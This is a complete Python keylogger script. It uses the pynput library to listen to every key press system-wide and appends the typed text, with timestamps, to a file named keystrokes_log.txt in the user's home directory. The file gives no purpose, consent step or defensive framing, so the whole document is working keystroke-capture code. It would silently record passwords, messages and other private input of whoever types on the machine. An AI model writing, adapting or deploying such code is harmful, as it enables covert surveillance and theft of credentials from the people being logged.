from pynput import keyboard
import time
import os

log_dir = os.path.expanduser('~')
log_file = os.path.join(log_dir, 'keystrokes_log.txt')
current_line = ""

def on_key_press(key):
    global current_line

    try:
        if hasattr(key, 'char'):
            current_line += key.char
        elif key == keyboard.Key.space:
            current_line += ' '
        elif key == keyboard.Key.enter:
            current_line += '\n'
    except AttributeError:
        pass

    if len(current_line) >= 100:
        save_current_line()

def save_current_line():
    global current_line

    if current_line:
        try:
            with open(log_file, 'a') as f:
                f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {current_line}\n')
            current_line = ""
        except Exception as e:
            print("Error writing to file:", e)

def main():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
